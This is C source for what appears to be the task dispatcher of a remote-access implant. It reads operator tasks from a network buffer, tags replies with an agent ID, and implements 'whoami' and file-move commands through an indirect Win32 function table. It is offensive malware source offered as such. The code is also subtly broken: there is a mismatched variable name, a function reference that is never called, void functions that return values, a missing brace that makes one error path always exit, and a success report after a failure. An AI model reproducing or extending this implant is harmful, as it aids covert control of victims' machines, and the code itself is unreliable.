#include "../../includes/core/core.h"
#include "../../includes/net/net.h"
#include "../../includes/byte/byte.h"
#include "../../includes/core/tasker.h"


BOOL Dispatch() {
	packager->NewParser(g_NetMgr->RecvBuf(), g_NetMgr->RecvSize);
	INT32 TotalTasks = packager->Parse4();
	if (TotalTasks == 0) 
		return TRUE;
	packager->Pack4(MSG_OUTPUT);
	packager->Pack4(hollow->config->AgentID);
	packager->Pack4(TotalTasks);
	for (INT i = 0; i < TotalTasks; i++) {
		INT32 Code = packager->Parse4();
		switch (code)
		{
		case TASK_WHOAMI:
			do_whoami();
			return;
		case TASK_MV:
			do_mv;
			return;
		default:
			break;
		}

	}
	return TRUE;
	
}


void do_whoami() {
	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	DWORD BufSize = 0;
	

	hollow->Win32.GetUserNameA(NULL, &BufSize);
	if (!BufSize)
		packager->Pack4(TASK_FAILED);
		return NULL;

	PBYTE buf = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, BufSize);
	if (!buf)
		return NULL;

	if (!hollow->Win32.GetUserNameA((PCHAR)buf, &BufSize)) {
		packager->Pack4(TASK_FAILED);
		hollow->Win32.LocalFree(buf);
		return NULL;
	}
	packager->Pack4(OUTPUT_NEEDS_PARSE);
	packager->Pack4(PARSE_WHOAMI);
	packager->Pack4(BufSize);
	packager->PackBytes(buf, BufSize);		
	if(buf) { hollow->Win32.LocalFree(buf); }
	return;
}


void do_mv() {
	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	INT32 srclen = packager->Parse4();
	PBYTE src = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, srclen);
	packager->ParseBytes(src, srclen);
	INT32 dstLen = packager->Parse4();
	PBYTE dst = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, dstLen);
	packager->ParseBytes(dst, dstLen);

	if (!hollow->Win32.MoveFileA(src, dst)) {
		packager->Pack4(TASK_FAILED);
		hollow->Win32.LocalFree(src);
		hollow->Win32.LocalFree(dst);
	}
	packager->Pack4(MV_SUCCESS);
	if (src) { hollow->Win32.LocalFree(src); }
	if (dst) { hollow->Win32.LocalFree(dst); }
	return;
}